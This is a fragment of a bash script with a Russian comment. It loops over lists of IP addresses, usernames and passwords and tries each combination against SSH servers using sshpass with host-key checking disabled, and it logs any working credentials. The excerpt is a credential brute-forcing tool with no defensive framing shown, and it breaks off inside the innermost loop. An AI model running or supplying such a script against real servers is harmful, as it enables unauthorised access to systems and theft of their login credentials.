...
# В случае успешного подключения, выводит IP адрес сервера и валидные креды от него в $LOG_FILE.
...
for IP in "${IP_ARRAY[@]}"; do
    for USER in "${USERS_ARRAY[@]}"; do
        for PASS in "${PASSWORDS_ARRAY[@]}"; do
            result=$(sshpass -p "$PASS" ssh -q -o StrictHostKeyChecking=no "$USER"@"$IP" echo 'CONNECTED' 2>/dev/null)
